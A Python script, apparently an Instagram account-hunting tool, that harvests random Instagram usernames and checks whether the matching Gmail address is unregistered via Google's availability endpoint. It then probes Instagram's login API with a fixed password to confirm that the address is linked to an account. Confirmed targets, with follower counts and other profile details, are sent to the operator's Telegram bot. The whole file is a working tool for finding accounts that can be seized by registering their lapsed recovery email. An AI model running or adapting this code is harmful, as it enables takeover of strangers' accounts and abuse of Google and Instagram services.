import requests
import random
from uuid import uuid4
import cfonts
from cfonts import render
import time
import threading
import json
import sys
import os
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
R = '\033[2;34m'
j = '\033[2;35m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
E = '\033[1;31m' 
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"

logo = render('H A M O',colors=["green","blue"],align='center')
for i in logo.splitlines():
	time.sleep(0.05)
	print(i)
print( """ \033[1;91m------------------------------------ """)
token = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER TOKEN  : " + E)
ID = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER ID  : " + E)
sessionid = input(C + " (" + E + "⌯" + C + ") " + C + "ENTER SESSIONID  : " + E)
header ={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}
print( """ \033[1;91m------------------------------------ """)

def hunt(email,user):
	user = str(user)
	email = str(email)
	uid = uuid4()
	url = "https://i.instagram.com/api/v1/accounts/login/"
	headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
	data = {'uuid':uid,  'password':'Hamody@010',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
	req= requests.post(url, headers=headers, data=data).json()
	if req['message'] == 'The password you entered is incorrect. Please try again.':
		url = f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}"
		r = requests.get(url).json()
		na = r["results"]["name"]
		po = r["results"]["Posts"]
		fo = r["results"]["Followers"]
		fl = r["results"]["Following"]
		id = r["results"]["id"]
		cr = r["results"]["created date"]
		acc = f"""
⌯ Instagram successful ✅ ⌯ 
. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .
[💔] NAME ➥ {na}            
[👻] Username ➥ {user}        
[📧] Email ➥ {email}            
[👥] Followers ➥ {fo}        
[🗣] Following ➥ {fl}            
[🆔] ID ➥ {id}    
[💞] POSTS ➥ {po}            
[⏱] Data ➥ {cr}            
[💘] link » https://www.instagram.com/{user}
. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .
⚖️ Tele : @M_A_S_Y | @SG099U """
		requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={acc}")
		print(E+acc)
	if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
		print(f"{R} BAD INSTAGRAM {email}")
	else:
		print(f"{R} BAD INSTAGRAM {email}")
		
def Gmail(email,user):
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	headers = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	data = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'HAMO',
		'lastName':'@M_A_S_Y'
	})
	check = requests.post(url,data=data,headers=headers)
	if check.json()['status'] == 'SUCCESS':
		print(f"{H} Good Gmail {email}")
		hunt(email,user)
	elif check.json()['status'] =='USERNAME_UNAVAILABLE':
		print(f"{A} BAD GMAIL {email}")
	else:
		print(f"{A} YOUR IP BOCKID ")
		exit()

def rand():
	while True:
		user='1234567890qwertyuiopasdfghjklzxcvbnm.'
		num='456789'
		rng=int("".join(random.choice(num)for i in range(1)))
		name=str("".join(random.choice(user)for i in range(rng)))
		ch = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
		deed=0
		if "users" in ch.text:
			for i in ch.json()["users"]:
				deed+=1
				user=(i['user']['username'])
				em = user
				email = em+"@gmail.com"
				Gmail(email,user)
		else:
			rand()

rand()
